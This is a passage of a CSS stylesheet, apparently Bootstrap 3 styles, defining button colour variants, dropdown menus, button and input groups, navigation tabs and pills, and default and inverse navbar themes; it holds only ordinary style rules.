.btn-primary.disabled, .btn-primary[disabled], fieldset[disabled] .btn-primary, .btn-primary.disabled:hover, .btn-primary[disabled]:hover, fieldset[disabled] .btn-primary:hover, .btn-primary.disabled:focus, .btn-primary[disabled]:focus, fieldset[disabled] .btn-primary:focus, .btn-primary.disabled:active, .btn-primary[disabled]:active, fieldset[disabled] .btn-primary:active, .btn-primary.disabled.active, .btn-primary.active[disabled], fieldset[disabled] .btn-primary.active { background-color: rgb(66, 139, 202); border-color: rgb(53, 126, 189); }

.btn-primary .badge { color: rgb(66, 139, 202); background-color: rgb(255, 255, 255); }

.btn-success { color: rgb(255, 255, 255); background-color: rgb(92, 184, 92); border-color: rgb(76, 174, 76); }

.btn-success:hover, .btn-success:focus, .btn-success:active, .btn-success.active, .open > .dropdown-toggle.btn-success { color: rgb(255, 255, 255); background-color: rgb(68, 157, 68); border-color: rgb(57, 132, 57); }

.btn-success:active, .btn-success.active, .open > .dropdown-toggle.btn-success { background-image: none; }

.btn-success.disabled, .btn-success[disabled], fieldset[disabled] .btn-success, .btn-success.disabled:hover, .btn-success[disabled]:hover, fieldset[disabled] .btn-success:hover, .btn-success.disabled:focus, .btn-success[disabled]:focus, fieldset[disabled] .btn-success:focus, .btn-success.disabled:active, .btn-success[disabled]:active, fieldset[disabled] .btn-success:active, .btn-success.disabled.active, .btn-success.active[disabled], fieldset[disabled] .btn-success.active { background-color: rgb(92, 184, 92); border-color: rgb(76, 174, 76); }

.btn-success .badge { color: rgb(92, 184, 92); background-color: rgb(255, 255, 255); }

.btn-info { color: rgb(255, 255, 255); background-color: rgb(91, 192, 222); border-color: rgb(70, 184, 218); }

.btn-info:hover, .btn-info:focus, .btn-info:active, .btn-info.active, .open > .dropdown-toggle.btn-info { color: rgb(255, 255, 255); background-color: rgb(49, 176, 213); border-color: rgb(38, 154, 188); }

.btn-info:active, .btn-info.active, .open > .dropdown-toggle.btn-info { background-image: none; }

.btn-info.disabled, .btn-info[disabled], fieldset[disabled] .btn-info, .btn-info.disabled:hover, .btn-info[disabled]:hover, fieldset[disabled] .btn-info:hover, .btn-info.disabled:focus, .btn-info[disabled]:focus, fieldset[disabled] .btn-info:focus, .btn-info.disabled:active, .btn-info[disabled]:active, fieldset[disabled] .btn-info:active, .btn-info.disabled.active, .btn-info.active[disabled], fieldset[disabled] .btn-info.active { background-color: rgb(91, 192, 222); border-color: rgb(70, 184, 218); }

.btn-info .badge { color: rgb(91, 192, 222); background-color: rgb(255, 255, 255); }

.btn-warning { color: rgb(255, 255, 255); background-color: rgb(240, 173, 78); border-color: rgb(238, 162, 54); }

.btn-warning:hover, .btn-warning:focus, .btn-warning:active, .btn-warning.active, .open > .dropdown-toggle.btn-warning { color: rgb(255, 255, 255); background-color: rgb(236, 151, 31); border-color: rgb(213, 133, 18); }

.btn-warning:active, .btn-warning.active, .open > .dropdown-toggle.btn-warning { background-image: none; }

.btn-warning.disabled, .btn-warning[disabled], fieldset[disabled] .btn-warning, .btn-warning.disabled:hover, .btn-warning[disabled]:hover, fieldset[disabled] .btn-warning:hover, .btn-warning.disabled:focus, .btn-warning[disabled]:focus, fieldset[disabled] .btn-warning:focus, .btn-warning.disabled:active, .btn-warning[disabled]:active, fieldset[disabled] .btn-warning:active, .btn-warning.disabled.active, .btn-warning.active[disabled], fieldset[disabled] .btn-warning.active { background-color: rgb(240, 173, 78); border-color: rgb(238, 162, 54); }

.btn-warning .badge { color: rgb(240, 173, 78); background-color: rgb(255, 255, 255); }

.btn-danger { color: rgb(255, 255, 255); background-color: rgb(217, 83, 79); border-color: rgb(212, 63, 58); }

.btn-danger:hover, .btn-danger:focus, .btn-danger:active, .btn-danger.active, .open > .dropdown-toggle.btn-danger { color: rgb(255, 255, 255); background-color: rgb(201, 48, 44); border-color: rgb(172, 41, 37); }

.btn-danger:active, .btn-danger.active, .open > .dropdown-toggle.btn-danger { background-image: none; }

.btn-danger.disabled, .btn-danger[disabled], fieldset[disabled] .btn-danger, .btn-danger.disabled:hover, .btn-danger[disabled]:hover, fieldset[disabled] .btn-danger:hover, .btn-danger.disabled:focus, .btn-danger[disabled]:focus, fieldset[disabled] .btn-danger:focus, .btn-danger.disabled:active, .btn-danger[disabled]:active, fieldset[disabled] .btn-danger:active, .btn-danger.disabled.active, .btn-danger.active[disabled], fieldset[disabled] .btn-danger.active { background-color: rgb(217, 83, 79); border-color: rgb(212, 63, 58); }

.btn-danger .badge { color: rgb(217, 83, 79); background-color: rgb(255, 255, 255); }

.btn-link { font-weight: 400; color: rgb(66, 139, 202); cursor: pointer; border-radius: 0px; }

.btn-link, .btn-link:active, .btn-link[disabled], fieldset[disabled] .btn-link { background-color: transparent; box-shadow: none; }

.btn-link, .btn-link:hover, .btn-link:focus, .btn-link:active { border-color: transparent; }

.btn-link:hover, .btn-link:focus { color: rgb(42, 100, 150); text-decoration: underline; background-color: transparent; }

.btn-link[disabled]:hover, fieldset[disabled] .btn-link:hover, .btn-link[disabled]:focus, fieldset[disabled] .btn-link:focus { color: rgb(119, 119, 119); text-decoration: none; }

.btn-lg, .btn-group-lg > .btn { padding: 10px 16px; font-size: 18px; line-height: 1.33; border-radius: 6px; }

.btn-sm, .btn-group-sm > .btn { padding: 5px 10px; font-size: 12px; line-height: 1.5; border-radius: 3px; }

.btn-xs, .btn-group-xs > .btn { padding: 1px 5px; font-size: 12px; line-height: 1.5; border-radius: 3px; }

.btn-block { display: block; width: 100%; }

.btn-block + .btn-block { margin-top: 5px; }

input.btn-block[type="submit"], input.btn-block[type="reset"], input.btn-block[type="button"] { width: 100%; }

.fade { opacity: 0; transition: opacity 0.15s linear 0s; }

.fade.in { opacity: 1; }

.collapse { display: none; }

.collapse.in { display: block; }

tr.collapse.in { display: table-row; }

tbody.collapse.in { display: table-row-group; }

.collapsing { position: relative; height: 0px; overflow: hidden; transition: height 0.35s ease 0s; }

.caret { display: inline-block; width: 0px; height: 0px; margin-left: 2px; vertical-align: middle; border-top: 4px solid; border-right: 4px solid transparent; border-left: 4px solid transparent; }

.dropdown { position: relative; }

.dropdown-toggle:focus { outline: 0px; }

.dropdown-menu { position: absolute; top: 100%; left: 0px; z-index: 1000; display: none; float: left; min-width: 160px; padding: 5px 0px; margin: 2px 0px 0px; font-size: 14px; text-align: left; list-style: none; background-color: rgb(255, 255, 255); background-clip: padding-box; border: 1px solid rgba(0, 0, 0, 0.15); border-radius: 4px; box-shadow: rgba(0, 0, 0, 0.176) 0px 6px 12px; }

.dropdown-menu.pull-right { right: 0px; left: auto; }

.dropdown-menu .divider { height: 1px; margin: 9px 0px; overflow: hidden; background-color: rgb(229, 229, 229); }

.dropdown-menu > li > a { display: block; padding: 3px 20px; clear: both; font-weight: 400; line-height: 1.42857; color: rgb(51, 51, 51); white-space: nowrap; }

.dropdown-menu > li > a:hover, .dropdown-menu > li > a:focus { color: rgb(38, 38, 38); text-decoration: none; background-color: rgb(245, 245, 245); }

.dropdown-menu > .active > a, .dropdown-menu > .active > a:hover, .dropdown-menu > .active > a:focus { color: rgb(255, 255, 255); text-decoration: none; background-color: rgb(66, 139, 202); outline: 0px; }

.dropdown-menu > .disabled > a, .dropdown-menu > .disabled > a:hover, .dropdown-menu > .disabled > a:focus { color: rgb(119, 119, 119); }

.dropdown-menu > .disabled > a:hover, .dropdown-menu > .disabled > a:focus { text-decoration: none; cursor: not-allowed; background-color: transparent; background-image: none; }

.open > .dropdown-menu { display: block; }

.open > a { outline: 0px; }

.dropdown-menu-right { right: 0px; left: auto; }

.dropdown-menu-left { right: auto; left: 0px; }

.dropdown-header { display: block; padding: 3px 20px; font-size: 12px; line-height: 1.42857; color: rgb(119, 119, 119); white-space: nowrap; }

.dropdown-backdrop { position: fixed; inset: 0px; z-index: 990; }

.pull-right > .dropdown-menu { right: 0px; left: auto; }

.dropup .caret, .navbar-fixed-bottom .dropdown .caret { content: ""; border-top: 0px; border-bottom: 4px solid; }

.dropup .dropdown-menu, .navbar-fixed-bottom .dropdown .dropdown-menu { top: auto; bottom: 100%; margin-bottom: 1px; }

@media (min-width: 991px) {
  .navbar-right .dropdown-menu { right: 0px; left: auto; }
  .navbar-right .dropdown-menu-left { right: auto; left: 0px; }
}

.btn-group, .btn-group-vertical { position: relative; display: inline-block; vertical-align: middle; }

.btn-group > .btn, .btn-group-vertical > .btn { position: relative; float: left; }

.btn-group > .btn:hover, .btn-group-vertical > .btn:hover, .btn-group > .btn:focus, .btn-group-vertical > .btn:focus, .btn-group > .btn:active, .btn-group-vertical > .btn:active, .btn-group > .btn.active, .btn-group-vertical > .btn.active { z-index: 2; }

.btn-group > .btn:focus, .btn-group-vertical > .btn:focus { outline: 0px; }

.btn-group .btn + .btn, .btn-group .btn + .btn-group, .btn-group .btn-group + .btn, .btn-group .btn-group + .btn-group { margin-left: -1px; }

.btn-toolbar { margin-left: -5px; }

.btn-toolbar .btn-group, .btn-toolbar .input-group { float: left; }

.btn-toolbar > .btn, .btn-toolbar > .btn-group, .btn-toolbar > .input-group { margin-left: 5px; }

.btn-group > .btn:not(:first-child):not(:last-child):not(.dropdown-toggle) { border-radius: 0px; }

.btn-group > .btn:first-child { margin-left: 0px; }

.btn-group > .btn:first-child:not(:last-child):not(.dropdown-toggle) { border-top-right-radius: 0px; border-bottom-right-radius: 0px; }

.btn-group > .btn:last-child:not(:first-child), .btn-group > .dropdown-toggle:not(:first-child) { border-top-left-radius: 0px; border-bottom-left-radius: 0px; }

.btn-group > .btn-group { float: left; }

.btn-group > .btn-group:not(:first-child):not(:last-child) > .btn { border-radius: 0px; }

.btn-group > .btn-group:first-child > .btn:last-child, .btn-group > .btn-group:first-child > .dropdown-toggle { border-top-right-radius: 0px; border-bottom-right-radius: 0px; }

.btn-group > .btn-group:last-child > .btn:first-child { border-top-left-radius: 0px; border-bottom-left-radius: 0px; }

.btn-group .dropdown-toggle:active, .btn-group.open .dropdown-toggle { outline: 0px; }

.btn-group > .btn + .dropdown-toggle { padding-right: 8px; padding-left: 8px; }

.btn-group > .btn-lg + .dropdown-toggle { padding-right: 12px; padding-left: 12px; }

.btn-group.open .dropdown-toggle { box-shadow: rgba(0, 0, 0, 0.125) 0px 3px 5px inset; }

.btn-group.open .dropdown-toggle.btn-link { box-shadow: none; }

.btn .caret { margin-left: 0px; }

.btn-lg .caret { border-width: 5px 5px 0px; }

.dropup .btn-lg .caret { border-width: 0px 5px 5px; }

.btn-group-vertical > .btn, .btn-group-vertical > .btn-group, .btn-group-vertical > .btn-group > .btn { display: block; float: none; width: 100%; max-width: 100%; }

.btn-group-vertical > .btn-group > .btn { float: none; }

.btn-group-vertical > .btn + .btn, .btn-group-vertical > .btn + .btn-group, .btn-group-vertical > .btn-group + .btn, .btn-group-vertical > .btn-group + .btn-group { margin-top: -1px; margin-left: 0px; }

.btn-group-vertical > .btn:not(:first-child):not(:last-child) { border-radius: 0px; }

.btn-group-vertical > .btn:first-child:not(:last-child) { border-top-right-radius: 4px; border-bottom-right-radius: 0px; border-bottom-left-radius: 0px; }

.btn-group-vertical > .btn:last-child:not(:first-child) { border-top-left-radius: 0px; border-top-right-radius: 0px; border-bottom-left-radius: 4px; }

.btn-group-vertical > .btn-group:not(:first-child):not(:last-child) > .btn { border-radius: 0px; }

.btn-group-vertical > .btn-group:first-child:not(:last-child) > .btn:last-child, .btn-group-vertical > .btn-group:first-child:not(:last-child) > .dropdown-toggle { border-bottom-right-radius: 0px; border-bottom-left-radius: 0px; }

.btn-group-vertical > .btn-group:last-child:not(:first-child) > .btn:first-child { border-top-left-radius: 0px; border-top-right-radius: 0px; }

.btn-group-justified { display: table; width: 100%; table-layout: fixed; border-collapse: separate; }

.btn-group-justified > .btn, .btn-group-justified > .btn-group { display: table-cell; float: none; width: 1%; }

.btn-group-justified > .btn-group .btn { width: 100%; }

.btn-group-justified > .btn-group .dropdown-menu { left: auto; }

[data-toggle="buttons"] > .btn > input[type="radio"], [data-toggle="buttons"] > .btn > input[type="checkbox"] { position: absolute; z-index: -1; opacity: 0; }

.input-group { position: relative; display: table; border-collapse: separate; }

.input-group[class*="col-"] { float: none; padding-right: 0px; padding-left: 0px; }

.input-group .form-control { position: relative; z-index: 2; float: left; width: 100%; margin-bottom: 0px; }

.input-group-lg > .form-control, .input-group-lg > .input-group-addon, .input-group-lg > .input-group-btn > .btn { height: 46px; padding: 10px 16px; font-size: 18px; line-height: 1.33; border-radius: 6px; }

select.input-group-lg > .form-control, select.input-group-lg > .input-group-addon, select.input-group-lg > .input-group-btn > .btn { height: 46px; line-height: 46px; }

textarea.input-group-lg > .form-control, textarea.input-group-lg > .input-group-addon, textarea.input-group-lg > .input-group-btn > .btn, select.input-group-lg[multiple] > .form-control, select.input-group-lg[multiple] > .input-group-addon, select.input-group-lg[multiple] > .input-group-btn > .btn { height: auto; }

.input-group-sm > .form-control, .input-group-sm > .input-group-addon, .input-group-sm > .input-group-btn > .btn { height: 30px; padding: 5px 10px; font-size: 12px; line-height: 1.5; border-radius: 3px; }

select.input-group-sm > .form-control, select.input-group-sm > .input-group-addon, select.input-group-sm > .input-group-btn > .btn { height: 30px; line-height: 30px; }

textarea.input-group-sm > .form-control, textarea.input-group-sm > .input-group-addon, textarea.input-group-sm > .input-group-btn > .btn, select.input-group-sm[multiple] > .form-control, select.input-group-sm[multiple] > .input-group-addon, select.input-group-sm[multiple] > .input-group-btn > .btn { height: auto; }

.input-group-addon, .input-group-btn, .input-group .form-control { display: table-cell; }

.input-group-addon:not(:first-child):not(:last-child), .input-group-btn:not(:first-child):not(:last-child), .input-group .form-control:not(:first-child):not(:last-child) { border-radius: 0px; }

.input-group-addon, .input-group-btn { width: 1%; white-space: nowrap; vertical-align: middle; }

.input-group-addon { padding: 6px 12px; font-size: 14px; font-weight: 400; line-height: 1; color: rgb(85, 85, 85); text-align: center; background-color: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); border-radius: 4px; }

.input-group-addon.input-sm { padding: 5px 10px; font-size: 12px; border-radius: 3px; }

.input-group-addon.input-lg { padding: 10px 16px; font-size: 18px; border-radius: 6px; }

.input-group-addon input[type="radio"], .input-group-addon input[type="checkbox"] { margin-top: 0px; }

.input-group .form-control:first-child, .input-group-addon:first-child, .input-group-btn:first-child > .btn, .input-group-btn:first-child > .btn-group > .btn, .input-group-btn:first-child > .dropdown-toggle, .input-group-btn:last-child > .btn:not(:last-child):not(.dropdown-toggle), .input-group-btn:last-child > .btn-group:not(:last-child) > .btn { border-top-right-radius: 0px; border-bottom-right-radius: 0px; }

.input-group-addon:first-child { border-right: 0px; }

.input-group .form-control:last-child, .input-group-addon:last-child, .input-group-btn:last-child > .btn, .input-group-btn:last-child > .btn-group > .btn, .input-group-btn:last-child > .dropdown-toggle, .input-group-btn:first-child > .btn:not(:first-child), .input-group-btn:first-child > .btn-group:not(:first-child) > .btn { border-top-left-radius: 0px; border-bottom-left-radius: 0px; }

.input-group-addon:last-child { border-left: 0px; }

.input-group-btn { position: relative; font-size: 0px; white-space: nowrap; }

.input-group-btn > .btn { position: relative; }

.input-group-btn > .btn + .btn { margin-left: -1px; }

.input-group-btn > .btn:hover, .input-group-btn > .btn:focus, .input-group-btn > .btn:active { z-index: 2; }

.input-group-btn:first-child > .btn, .input-group-btn:first-child > .btn-group { margin-right: -1px; }

.input-group-btn:last-child > .btn, .input-group-btn:last-child > .btn-group { margin-left: -1px; }

.nav { padding-left: 0px; margin-bottom: 0px; list-style: none; }

.nav > li { position: relative; display: block; }

.nav > li > a { position: relative; display: block; padding: 10px 15px; }

.nav > li > a:hover, .nav > li > a:focus { text-decoration: none; background-color: rgb(238, 238, 238); }

.nav > li.disabled > a { color: rgb(119, 119, 119); }

.nav > li.disabled > a:hover, .nav > li.disabled > a:focus { color: rgb(119, 119, 119); text-decoration: none; cursor: not-allowed; background-color: transparent; }

.nav .open > a, .nav .open > a:hover, .nav .open > a:focus { background-color: rgb(238, 238, 238); border-color: rgb(66, 139, 202); }

.nav .nav-divider { height: 1px; margin: 9px 0px; overflow: hidden; background-color: rgb(229, 229, 229); }

.nav > li > a > img { max-width: none; }

.nav-tabs { border-bottom: 1px solid rgb(221, 221, 221); }

.nav-tabs > li { float: left; margin-bottom: -1px; }

.nav-tabs > li > a { margin-right: 2px; line-height: 1.42857; border: 1px solid transparent; border-radius: 4px 4px 0px 0px; }

.nav-tabs > li > a:hover { border-color: rgb(238, 238, 238) rgb(238, 238, 238) rgb(221, 221, 221); }

.nav-tabs > li.active > a, .nav-tabs > li.active > a:hover, .nav-tabs > li.active > a:focus { color: rgb(85, 85, 85); cursor: default; background-color: rgb(255, 255, 255); border-width: 1px; border-style: solid; border-color: rgb(221, 221, 221) rgb(221, 221, 221) transparent; border-image: initial; }

.nav-tabs.nav-justified { width: 100%; border-bottom: 0px; }

.nav-tabs.nav-justified > li { float: none; }

.nav-tabs.nav-justified > li > a { margin-bottom: 5px; text-align: center; }

.nav-tabs.nav-justified > .dropdown .dropdown-menu { top: auto; left: auto; }

@media (min-width: 768px) {
  .nav-tabs.nav-justified > li { display: table-cell; width: 1%; }
  .nav-tabs.nav-justified > li > a { margin-bottom: 0px; }
}

.nav-tabs.nav-justified > li > a { margin-right: 0px; border-radius: 4px; }

.nav-tabs.nav-justified > .active > a, .nav-tabs.nav-justified > .active > a:hover, .nav-tabs.nav-justified > .active > a:focus { border: 1px solid rgb(221, 221, 221); }

@media (min-width: 768px) {
  .nav-tabs.nav-justified > li > a { border-bottom: 1px solid rgb(221, 221, 221); border-radius: 4px 4px 0px 0px; }
  .nav-tabs.nav-justified > .active > a, .nav-tabs.nav-justified > .active > a:hover, .nav-tabs.nav-justified > .active > a:focus { border-bottom-color: rgb(255, 255, 255); }
}

.nav-pills > li { float: left; }

.nav-pills > li > a { border-radius: 4px; }

.nav-pills > li + li { margin-left: 2px; }

.nav-pills > li.active > a, .nav-pills > li.active > a:hover, .nav-pills > li.active > a:focus { color: rgb(255, 255, 255); background-color: rgb(66, 139, 202); }

.nav-stacked > li { float: none; }

.nav-stacked > li + li { margin-top: 2px; margin-left: 0px; }

.nav-justified { width: 100%; }

.nav-justified > li { float: none; }

.nav-justified > li > a { margin-bottom: 5px; text-align: center; }

.nav-justified > .dropdown .dropdown-menu { top: auto; left: auto; }

@media (min-width: 768px) {
  .nav-justified > li { display: table-cell; width: 1%; }
  .nav-justified > li > a { margin-bottom: 0px; }
}

.nav-tabs-justified { border-bottom: 0px; }

.nav-tabs-justified > li > a { margin-right: 0px; border-radius: 4px; }

.nav-tabs-justified > .active > a, .nav-tabs-justified > .active > a:hover, .nav-tabs-justified > .active > a:focus { border: 1px solid rgb(221, 221, 221); }

@media (min-width: 768px) {
  .nav-tabs-justified > li > a { border-bottom: 1px solid rgb(221, 221, 221); border-radius: 4px 4px 0px 0px; }
  .nav-tabs-justified > .active > a, .nav-tabs-justified > .active > a:hover, .nav-tabs-justified > .active > a:focus { border-bottom-color: rgb(255, 255, 255); }
}

.tab-content > .tab-pane { display: none; }

.tab-content > .active { display: block; }

.nav-tabs .dropdown-menu { margin-top: -1px; border-top-left-radius: 0px; border-top-right-radius: 0px; }

.navbar { position: relative; min-height: 50px; margin-bottom: 20px; border: 1px solid transparent; }

@media (min-width: 768px) {
  .navbar { border-radius: 4px; }
}

@media (min-width: 768px) {
  .navbar-header { float: left; }
}

.navbar-collapse { padding-right: 15px; padding-left: 15px; overflow-x: visible; border-top: 1px solid transparent; box-shadow: rgba(255, 255, 255, 0.1) 0px 1px 0px inset; }

.navbar-collapse.in { overflow-y: auto; }

@media (min-width: 991px) {
  .navbar-collapse { width: auto; border-top: 0px; box-shadow: none; }
  .navbar-collapse.collapse { padding-bottom: 0px; display: block !important; height: auto !important; overflow: visible !important; }
  .navbar-collapse.in { overflow-y: visible; }
  .navbar-fixed-top .navbar-collapse, .navbar-static-top .navbar-collapse, .navbar-fixed-bottom .navbar-collapse { padding-right: 0px; padding-left: 0px; }
}

.navbar-fixed-top .navbar-collapse, .navbar-fixed-bottom .navbar-collapse { max-height: 340px; }

@media (max-width: 480px) and (orientation: landscape) {
  .navbar-fixed-top .navbar-collapse, .navbar-fixed-bottom .navbar-collapse { max-height: 200px; }
}

.container > .navbar-header, .container-fluid > .navbar-header, .container > .navbar-collapse, .container-fluid > .navbar-collapse { margin-right: -15px; margin-left: -15px; }

@media (min-width: 768px) {
  .container > .navbar-header, .container-fluid > .navbar-header, .container > .navbar-collapse, .container-fluid > .navbar-collapse { margin-right: 0px; margin-left: 0px; }
}

.navbar-static-top { z-index: 1000; border-width: 0px 0px 1px; }

@media (min-width: 991px) {
  .navbar-static-top { border-radius: 0px; }
}

.navbar-fixed-top, .navbar-fixed-bottom { position: fixed; right: 0px; left: 0px; z-index: 1030; transform: translate3d(0px, 0px, 0px); }

@media (min-width: 768px) {
  .navbar-fixed-top, .navbar-fixed-bottom { border-radius: 0px; }
}

.navbar-fixed-top { top: 0px; border-width: 0px 0px 1px; }

.navbar-fixed-bottom { bottom: 0px; margin-bottom: 0px; border-width: 1px 0px 0px; }

.navbar-brand { float: left; height: 50px; padding: 15px; font-size: 18px; line-height: 20px; }

.navbar-brand:hover, .navbar-brand:focus { text-decoration: none; }

@media (min-width: 768px) {
  .navbar > .container .navbar-brand, .navbar > .container-fluid .navbar-brand { margin-left: -15px; }
}

.navbar-toggle { position: relative; float: right; padding: 9px 10px; margin-top: 8px; margin-right: 15px; margin-bottom: 8px; background-color: transparent; background-image: none; border: 1px solid transparent; border-radius: 4px; }

.navbar-toggle:focus { outline: 0px; }

.navbar-toggle .icon-bar { display: block; width: 22px; height: 2px; border-radius: 1px; }

.navbar-toggle .icon-bar + .icon-bar { margin-top: 4px; }

@media (min-width: 991px) {
  .navbar-toggle { display: none; }
}

.navbar-nav { margin: 7.5px -15px; }

.navbar-nav > li > a { padding-top: 10px; padding-bottom: 10px; line-height: 20px; }

@media (max-width: 990px) {
  .navbar-nav .open .dropdown-menu { position: static; float: none; width: auto; margin-top: 0px; background-color: transparent; border: 0px; box-shadow: none; }
  .navbar-nav .open .dropdown-menu > li > a, .navbar-nav .open .dropdown-menu .dropdown-header { padding: 5px 15px 5px 25px; }
  .navbar-nav .open .dropdown-menu > li > a { line-height: 20px; }
  .navbar-nav .open .dropdown-menu > li > a:hover, .navbar-nav .open .dropdown-menu > li > a:focus { background-image: none; }
}

@media (min-width: 991px) {
  .navbar-nav { float: left; margin: 0px; }
  .navbar-nav > li { float: left; }
  .navbar-nav > li > a { padding-top: 15px; padding-bottom: 15px; }
  .navbar-nav.navbar-right:last-child { margin-right: -15px; }
}

@media (min-width: 991px) {
  .navbar-left { float: left !important; }
  .navbar-right { float: right !important; }
}

.navbar-form { padding: 10px 15px; margin: 8px -15px; border-top: 1px solid transparent; border-bottom: 1px solid transparent; box-shadow: rgba(255, 255, 255, 0.1) 0px 1px 0px inset, rgba(255, 255, 255, 0.1) 0px 1px 0px; }

@media (min-width: 768px) {
  .navbar-form .form-group { display: inline-block; margin-bottom: 0px; vertical-align: middle; }
  .navbar-form .form-control { display: inline-block; width: auto; vertical-align: middle; }
  .navbar-form .input-group { display: inline-table; vertical-align: middle; }
  .navbar-form .input-group .input-group-addon, .navbar-form .input-group .input-group-btn, .navbar-form .input-group .form-control { width: auto; }
  .navbar-form .input-group > .form-control { width: 100%; }
  .navbar-form .control-label { margin-bottom: 0px; vertical-align: middle; }
  .navbar-form .radio, .navbar-form .checkbox { display: inline-block; margin-top: 0px; margin-bottom: 0px; vertical-align: middle; }
  .navbar-form .radio label, .navbar-form .checkbox label { padding-left: 0px; }
  .navbar-form .radio input[type="radio"], .navbar-form .checkbox input[type="checkbox"] { position: relative; margin-left: 0px; }
  .navbar-form .has-feedback .form-control-feedback { top: 0px; }
}

@media (max-width: 767px) {
  .navbar-form .form-group { margin-bottom: 5px; }
}

@media (min-width: 768px) {
  .navbar-form { width: auto; padding-top: 0px; padding-bottom: 0px; margin-right: 0px; margin-left: 0px; border: 0px; box-shadow: none; }
  .navbar-form.navbar-right:last-child { margin-right: -15px; }
}

.navbar-nav > li > .dropdown-menu { margin-top: 0px; border-top-left-radius: 0px; border-top-right-radius: 0px; }

.navbar-fixed-bottom .navbar-nav > li > .dropdown-menu { border-bottom-right-radius: 0px; border-bottom-left-radius: 0px; }

.navbar-btn { margin-top: 8px; margin-bottom: 8px; }

.navbar-btn.btn-sm { margin-top: 10px; margin-bottom: 10px; }

.navbar-btn.btn-xs { margin-top: 14px; margin-bottom: 14px; }

.navbar-text { margin-top: 15px; margin-bottom: 15px; }

@media (min-width: 768px) {
  .navbar-text { float: left; margin-right: 15px; margin-left: 15px; }
  .navbar-text.navbar-right:last-child { margin-right: 0px; }
}

.navbar-default { background-color: rgb(248, 248, 248); border-color: rgb(231, 231, 231); }

.navbar-default .navbar-brand { color: rgb(119, 119, 119); }

.navbar-default .navbar-brand:hover, .navbar-default .navbar-brand:focus { color: rgb(94, 94, 94); background-color: transparent; }

.navbar-default .navbar-text { color: rgb(119, 119, 119); }

.navbar-default .navbar-nav > li > a { color: rgb(119, 119, 119); }

.navbar-default .navbar-nav > li > a:hover, .navbar-default .navbar-nav > li > a:focus { color: rgb(51, 51, 51); background-color: transparent; }

.navbar-default .navbar-nav > .active > a, .navbar-default .navbar-nav > .active > a:hover, .navbar-default .navbar-nav > .active > a:focus { color: rgb(85, 85, 85); background-color: rgb(231, 231, 231); }

.navbar-default .navbar-nav > .disabled > a, .navbar-default .navbar-nav > .disabled > a:hover, .navbar-default .navbar-nav > .disabled > a:focus { color: rgb(204, 204, 204); background-color: transparent; }

.navbar-default .navbar-toggle { border-color: rgb(221, 221, 221); }

.navbar-default .navbar-toggle:hover, .navbar-default .navbar-toggle:focus { background-color: rgb(221, 221, 221); }

.navbar-default .navbar-toggle .icon-bar { background-color: rgb(136, 136, 136); }

.navbar-default .navbar-collapse, .navbar-default .navbar-form { border-color: rgb(231, 231, 231); }

.navbar-default .navbar-nav > .open > a, .navbar-default .navbar-nav > .open > a:hover, .navbar-default .navbar-nav > .open > a:focus { color: rgb(85, 85, 85); background-color: rgb(231, 231, 231); }

@media (max-width: 990px) {
  .navbar-default .navbar-nav .open .dropdown-menu > li > a { color: rgb(119, 119, 119); }
  .navbar-default .navbar-nav .open .dropdown-menu > li > a:hover, .navbar-default .navbar-nav .open .dropdown-menu > li > a:focus { color: rgb(51, 51, 51); background-color: transparent; }
  .navbar-default .navbar-nav .open .dropdown-menu > .active > a, .navbar-default .navbar-nav .open .dropdown-menu > .active > a:hover, .navbar-default .navbar-nav .open .dropdown-menu > .active > a:focus { color: rgb(85, 85, 85); background-color: rgb(231, 231, 231); }
  .navbar-default .navbar-nav .open .dropdown-menu > .disabled > a, .navbar-default .navbar-nav .open .dropdown-menu > .disabled > a:hover, .navbar-default .navbar-nav .open .dropdown-menu > .disabled > a:focus { color: rgb(204, 204, 204); background-color: transparent; }
}

.navbar-default .navbar-link { color: rgb(119, 119, 119); }

.navbar-default .navbar-link:hover { color: rgb(51, 51, 51); }

.navbar-default .btn-link { color: rgb(119, 119, 119); }

.navbar-default .btn-link:hover, .navbar-default .btn-link:focus { color: rgb(51, 51, 51); }

.navbar-default .btn-link[disabled]:hover, fieldset[disabled] .navbar-default .btn-link:hover, .navbar-default .btn-link[disabled]:focus, fieldset[disabled] .navbar-default .btn-link:focus { color: rgb(204, 204, 204); }

.navbar-inverse { background-color: rgb(34, 34, 34); border-color: rgb(8, 8, 8); }

.navbar-inverse .navbar-brand { color: rgb(119, 119, 119); }

.navbar-inverse .navbar-brand:hover, .navbar-inverse .navbar-brand:focus { color: rgb(255, 255, 255); background-color: transparent; }

.navbar-inverse .navbar-text { color: rgb(119, 119, 119); }

.navbar-inverse .navbar-nav > li > a { color: rgb(119, 119, 119); }

.navbar-inverse .navbar-nav > li > a:hover, .navbar-inverse .navbar-nav > li > a:focus { color: rgb(255, 255, 255); background-color: transparent; }

.navbar-inverse .navbar-nav > .active > a, .navbar-inverse .navbar-nav > .active > a:hover, .navbar-inverse .navbar-nav > .active > a:focus { color: rgb(255, 255, 255); background-color: rgb(8, 8, 8); }

.navbar-inverse .navbar-nav > .disabled > a, .navbar-inverse .navbar-nav > .disabled > a:hover, .navbar-inverse .navbar-nav > .disabled > a:focus { color: rgb(68, 68, 68); background-color: transparent; }

.navbar-inverse .navbar-toggle { border-color: rgb(51, 51, 51); }

.navbar-inverse .navbar-toggle:hover, .navbar-inverse .navbar-toggle:focus { background-color: rgb(51, 51, 51); }

.navbar-inverse .navbar-toggle .icon-bar { background-color: rgb(255, 255, 255); }

.navbar-inverse .navbar-collapse, .navbar-inverse .navbar-form { border-color: rgb(16, 16, 16); }

.navbar-inverse .navbar-nav > .open > a, .navbar-inverse .navbar-nav > .open > a:hover, .navbar-inverse .navbar-nav > .open > a:focus { color: rgb(255, 255, 255); background-color: rgb(8, 8, 8); }

@media (max-width: 767px) {
  .navbar-inverse .navbar-nav .open .dropdown-menu > .dropdown-header { border-color: rgb(8, 8, 8); }
  .navbar-inverse .navbar-nav .open .dropdown-menu .divider { background-color: rgb(8, 8, 8); }
  .navbar-inverse .navbar-nav .open .dropdown-menu > li > a { color: rgb(119, 119, 119); }
  .navbar-inverse .navbar-nav .open .dropdown-menu > li > a:hover, .navbar-inverse .navbar-nav .open .dropdown-menu > li > a:focus { color: rgb(255, 255, 255); background-color: transparent; }
  .navbar-inverse .navbar-nav .open .dropdown-menu > .active > a, .navbar-inverse .navbar-nav .open .dropdown-menu > .active > a:hover, .navbar-inverse .navbar-nav .open .dropdown-menu > .active > a:focus { color: rgb(255, 255, 255); background-color: rgb(8, 8, 8); }
